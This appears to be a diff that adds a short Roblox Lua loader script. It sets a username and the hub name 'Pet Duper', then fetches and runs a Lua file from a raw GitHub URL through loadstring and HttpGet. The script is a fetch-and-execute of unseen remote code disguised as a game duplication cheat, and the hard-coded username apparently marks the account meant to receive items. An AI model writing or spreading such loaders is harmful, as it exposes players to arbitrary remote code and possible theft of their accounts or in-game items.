@@ -1,0 +1,3 @@
+_G.Username = "sangpro232"
+_G.HubName = "Pet Duper"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
